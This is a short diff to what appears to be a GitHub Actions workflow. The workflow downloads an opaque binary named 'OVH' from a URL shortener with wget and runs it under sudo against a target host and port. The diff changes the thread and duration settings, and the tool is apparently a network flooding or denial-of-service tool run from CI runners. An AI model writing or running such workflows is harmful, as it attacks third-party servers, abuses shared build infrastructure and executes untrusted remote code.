@@ -32,15 +32,7 @@ jobs:
           wget https://curl.by/UfAFb/ovhand -O OVH
           chmod +x OVH || true
 
-          PIDS=()
-          for i in {1..2}; do
-            sudo timeout 30 ./OVH "$TARGET" "$PORT" 4 30 &
-            PIDS+=($!)
-          done
-
-          for pid in "${PIDS[@]}"; do
-            wait $pid
-          done
+          sudo timeout 30 ./OVH "$TARGET" "$PORT" 8 30 &
 
       - name: Finish !
         run: |
